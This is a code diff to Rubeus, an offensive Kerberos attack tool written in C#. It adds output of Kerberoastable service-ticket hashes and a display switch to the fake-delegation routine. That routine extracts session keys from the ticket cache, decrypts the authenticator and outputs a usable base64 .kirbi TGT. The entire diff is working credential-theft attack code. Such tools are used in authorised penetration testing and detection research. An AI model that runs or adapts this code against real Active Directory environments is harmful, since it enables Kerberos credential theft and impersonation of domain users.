@@ -1981,7 +1981,7 @@ namespace Rubeus
             DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
             DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
             Interop.TicketFlags flags = cred.enc_part.ticket_info[0].flags;
-            
+
             Console.WriteLine("  UserName              :  {0}", userName);
             Console.WriteLine("  UserRealm             :  {0}", domainName);
             Console.WriteLine("  ServiceName           :  {0}", sname);
@@ -1991,7 +1991,15 @@ namespace Rubeus
             Console.WriteLine("  RenewTill             :  {0}", renewTill);
             Console.WriteLine("  Flags                 :  {0}", flags);
             Console.WriteLine("  KeyType               :  {0}", keyType);
-            Console.WriteLine("  Base64(key)           :  {0}\r\n", b64Key);
+            Console.WriteLine("  Base64(key)           :  {0}", b64Key);
+
+            if (!Regex.IsMatch(sname, "^krbtgt.*", RegexOptions.IgnoreCase))
+            {
+                // if this isn't a TGT, display a Kerberoastable hash
+                Roast.DisplayTGShash(cred);
+            }
+
+            Console.WriteLine();
         }
 
         public static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
@@ -2083,15 +2091,21 @@ namespace Rubeus
             return returnedSessionKey;
         }
 
-        public static byte[] RequestFakeDelegTicket(string targetSPN = "")
+        public static byte[] RequestFakeDelegTicket(string targetSPN = "", bool display = true)
         {
-            Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
+            if (display)
+            {
+                Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
+            }
 
             byte[] finalTGTBytes = null;
 
             if (String.IsNullOrEmpty(targetSPN))
             {
-                Console.WriteLine("[*] No target SPN specified, attempting to build 'HOST/dc.domain.com'");
+                if (display)
+                {
+                    Console.WriteLine("[*] No target SPN specified, attempting to build 'HOST/dc.domain.com'");
+                }
                 string domainController = Networking.GetDCName();
                 if(String.IsNullOrEmpty(domainController))
                 {
@@ -2118,7 +2132,10 @@ namespace Rubeus
                 int SEC_E_OK = 0x00000000;
                 int SEC_I_CONTINUE_NEEDED = 0x00090312;
 
-                Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                if (display)
+                {
+                    Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);
+                }
 
                 // now initialize the fake delegate ticket for the specified targetname (default HOST/DC.domain.com)
                 int status2 = Interop.InitializeSecurityContext(ref phCredential,
@@ -2136,11 +2153,17 @@ namespace Rubeus
 
                 if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
                 {
-                    Console.WriteLine("[+] Kerberos GSS-API initialization success!");
+                    if (display)
+                    {
+                        Console.WriteLine("[+] Kerberos GSS-API initialization success!");
+                    }
 
                     if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                     {
-                        Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
+                        if (display)
+                        {
+                            Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");
+                        }
 
                         // the fake delegate AP-REQ ticket is now in the cache!
 
@@ -2156,7 +2179,10 @@ namespace Rubeus
                             // check if the first two bytes == TOK_ID_KRB_AP_REQ
                             if ((ClientTokenArray[startIndex] == 1) && (ClientTokenArray[startIndex+1] == 0))
                             {
-                                Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
+                                if (display)
+                                {
+                                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
+                                }
 
                                 startIndex += 2;
                                 byte[] apReqArray = new byte[ClientTokenArray.Length-startIndex];
@@ -2173,7 +2199,10 @@ namespace Rubeus
                                         // build the encrypted authenticator
                                         EncryptedData encAuthenticator = new EncryptedData(elt.Sub[0]);
                                         Interop.KERB_ETYPE authenticatorEtype = (Interop.KERB_ETYPE)encAuthenticator.etype;
-                                        Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
+                                        if (display)
+                                        {
+                                            Console.WriteLine("[*] Authenticator etype: {0}", authenticatorEtype);
+                                        }
 
                                         // grab the service ticket session key from the local cache
                                         byte[] key = GetEncryptionKeyFromCache(targetSPN, authenticatorEtype);
@@ -2181,7 +2210,10 @@ namespace Rubeus
                                         if (key != null)
                                         {
                                             string base64SessionKey = Convert.ToBase64String(key);
-                                            Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
+                                            if (display)
+                                            {
+                                                Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
+                                            }
 
                                             // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
                                             byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
@@ -2192,7 +2224,10 @@ namespace Rubeus
                                             {
                                                 if (elt2.TagValue == 3)
                                                 {
-                                                    Console.WriteLine("[+] Successfully decrypted the authenticator");
+                                                    if (display)
+                                                    {
+                                                        Console.WriteLine("[+] Successfully decrypted the authenticator");
+                                                    }
 
                                                     int cksumtype = Convert.ToInt32(elt2.Sub[0].Sub[0].Sub[0].GetInteger());
 
@@ -2237,12 +2272,15 @@ namespace Rubeus
                                                             byte[] kirbiBytes = cred.Encode().Encode();
                                                             string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-                                                            Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
-
-                                                            // display the .kirbi base64, columns of 80 chararacters
-                                                            foreach (string line in Helpers.Split(kirbiString, 80))
+                                                            if (display)
                                                             {
-                                                                Console.WriteLine("      {0}", line);
+                                                                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+
+                                                                // display the .kirbi base64, columns of 80 chararacters
+                                                                foreach (string line in Helpers.Split(kirbiString, 80))
+                                                                {
+                                                                    Console.WriteLine("      {0}", line);
+                                                                }
                                                             }
 
                                                             finalTGTBytes = kirbiBytes;
